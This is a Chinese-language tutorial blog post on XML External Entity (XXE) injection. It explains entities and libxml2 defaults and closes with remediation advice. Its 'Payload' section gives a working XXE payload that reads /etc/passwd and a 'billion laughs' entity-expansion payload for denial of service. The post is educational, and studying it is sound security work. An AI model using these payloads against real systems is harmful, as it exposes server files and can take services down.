---
title: XML外部实体注入漏洞
date: 2018-02-19 15:34:46
tags: ["漏洞","Web","xml"]
categories: "漏洞"
thumbnail:
---

# XML外部实体注入漏洞（XXE）

1. ## 存在版本
    libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。PHP版本并不影响XXE利用。
2. ## 相关知识
    1. 什么是XML外部实体？

        如果你了解XML，你可以把XML理解为一个用来定义数据的东东。因此，两个采用不同技术的系统可以通过XML进行通信和交换数据。 比如，下图就是一个用来描述一个职工的XML文档样本，其中的'name','salary','address'被称为XML的元素。
        ```xml
        <?xml version="1.0"?>
        <employee>
        <name>DedSec</name>
        <salary>0.5</salary>
        <address>China</address>
        </employee>
        ```
        有些XML文档包含system标识符定义的“实体”，这些XML文档会在DOCTYPE头部标签中呈现。这些定义的’实体’能够访问本地或者远程的内容。比如，下面的XML文档样例就包含了XML ‘实体’。
        ```xml
        <?xml version="1.0" encoding="utf-8"?>
        <!DOCTYPE foo [
        <!ENTITY entityex SYSTEM "file:///etc/passwd">
        ]>
        <abc>&entityex;</abc>
        ```
        在上面的代码中， XML外部实体 ‘entityex’ 被赋予的值为：file://etc/passwd。在解析XML文档的过程中，实体’entityex’的值会被替换为URI(file://etc/passwd)内容值（也就是passwd文件的内容）。 关键字’SYSTEM’会告诉XML解析器，’entityex’实体的值将从其后的URI中读取。因此，XML实体被使用的次数越多，越有帮助。

    2. 什么是XML外部实体攻击？

        有了XML实体，关键字’SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。 简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）。比如，下面的代码将获取系统上folder/file的内容并呈献给用户。

        ```xml
        <?xml version="1.0" encoding="utf-8"?> 
        <!DOCTYPE xxe [
        <!ENTITY xxe SYSTEM "file:///folder/file" >]>
        <root>
        <abc>&xxe;</abc>
        </root>
        ```
3. ## 如何发现
    ![check](https://res.dedsec.club/php_xxe/check.png)
    ![attack](https://res.dedsec.club/php_xxe/attack.png)
4. ## [亲手试试](http://ctf.dedsec.club/cans/php_xxe/simplexml_load_string.php)
5. ## 影响
    此漏洞非常危险, 因为此漏洞会造成服务器上敏感数据的泄露，和潜在的服务器拒绝服务攻击。
6. ## Payload
    - 任意文件读取
    ```xml
    <?xml version="1.0" encoding="utf-8"?> 
    <!DOCTYPE xxe [
    <!ELEMENT name ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <root>
    <name>&xxe;</name>
    </root>
    ```
    - DDos
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
        <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
        <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
        <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
        <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <lolz>&lol9;</lolz>
    ```
7. ## 补救措施
    上面讨论的主要问题就是XML解析器解析了用户发送的不可信数据。然而，要去校验DTD(document type definition)中SYSTEM标识符定义的数据，并不容易，也不大可能。大部分的XML解析器默认对于XXE攻击是脆弱的。因此，最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD。